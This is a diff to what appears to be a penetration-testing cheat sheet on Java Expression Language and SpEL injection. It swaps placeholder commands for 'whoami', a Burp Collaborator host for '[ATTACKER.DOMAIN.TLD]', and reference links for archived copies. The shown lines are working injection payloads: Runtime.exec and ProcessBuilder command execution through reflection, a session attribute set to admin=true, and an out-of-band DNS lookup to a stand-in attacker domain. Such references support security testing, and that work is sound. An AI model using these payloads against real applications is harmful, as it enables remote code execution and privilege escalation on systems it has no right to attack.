@@ -397,7 +397,7 @@ ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().ex
 DNS lookup
 
 ```java
-${"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClass()).invoke("","xxxxxxxxxxxxxx.burpcollaborator.net")}
+${"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClass()).invoke("","[ATTACKER.DOMAIN.TLD]")}
 ```
 
 ### SpEL - Session Attributes
@@ -413,7 +413,7 @@ ${pageContext.request.getSession().setAttribute("admin",true)}
 - Method using `java.lang.Runtime` #1 - accessed with JavaClass
 
     ```java
-    ${T(java.lang.Runtime).getRuntime().exec("COMMAND_HERE")}
+    ${T(java.lang.Runtime).getRuntime().exec("whoami")}
     ```
 
 - Method using `java.lang.Runtime` #2
@@ -427,13 +427,13 @@ ${pageContext.request.getSession().setAttribute("admin",true)}
 - Method using `java.lang.Runtime` #3 - accessed with `invoke`
 
     ```java
-    ${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('COMMAND_HERE')}
+    ${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('whoami')}
     ```
 
 - Method using `java.lang.Runtime` #3 - accessed with `javax.script.ScriptEngineManager`
 
     ```java
-    ${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping x.x.x.x\\\")"))}
+    ${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"whoami\\\")"))}
     ```
 
 - Method using `java.lang.ProcessBuilder`
@@ -442,7 +442,7 @@ ${pageContext.request.getSession().setAttribute("admin",true)}
     ${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
     ${request.getAttribute("c").add("cmd.exe")}
     ${request.getAttribute("c").add("/k")}
-    ${request.getAttribute("c").add("ping x.x.x.x")}
+    ${request.getAttribute("c").add("whoami")}
     ${request.setAttribute("a","".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(request.getAttribute("c")).start())}
     ${request.getAttribute("a")}
     ```
@@ -509,7 +509,7 @@ Time-Based:
 
 ## References
 
-- [Bean Stalking: Growing Java beans into RCE - Alvaro Munoz - July 7, 2020](https://securitylab.github.com/research/bean-validation-RCE)
+- [Bean Stalking: Growing Java beans into RCE - Alvaro Munoz - July 7, 2020](https://web.archive.org/web/20200707130000/https://securitylab.github.com/research/bean-validation-RCE)
 - [Bug Writeup: RCE via SSTI on Spring Boot Error Page with Akamai WAF Bypass - Peter M (@pmnh_) - December 4, 2022](https://web.archive.org/web/20230203103413/https://h1pmnh.github.io/post/writeup_spring_el_waf_bypass/)
 - [Expression Language Injection - OWASP - December 4, 2019](https://web.archive.org/web/20200422030628/https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection)
 - [Expression Language injection - PortSwigger - January 27, 2019](https://web.archive.org/web/20251215015718/https://portswigger.net/kb/issues/00100f20_expression-language-injection)
@@ -522,4 +522,4 @@ Time-Based:
 - [Server-Side Template Injection: RCE For The Modern Web App (PDF) - James Kettle (@albinowax) - August 8, 2015](https://web.archive.org/web/20150808084830/https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)
 - [Server-Side Template Injection: RCE For The Modern Web App (Video) - James Kettle (@albinowax) - December 28, 2015](https://web.archive.org/web/20200501162014/https://www.youtube.com/watch?v=3cT0uE7Y87s)
 - [VelocityServlet Expression Language injection - MagicBlue - November 15, 2017](https://web.archive.org/web/20220412162651/https://magicbluech.github.io/2017/11/15/VelocityServlet-Expression-language-Injection/)
-- [Successful Errors: New Code Injection and SSTI Techniques - Vladislav Korchagin - January 03, 2026](https://github.com/vladko312/Research_Successful_Errors/blob/main/README.md)
+- [Successful Errors: New Code Injection and SSTI Techniques - Vladislav Korchagin - January 3, 2026](https://github.com/vladko312/Research_Successful_Errors/blob/main/README.md)
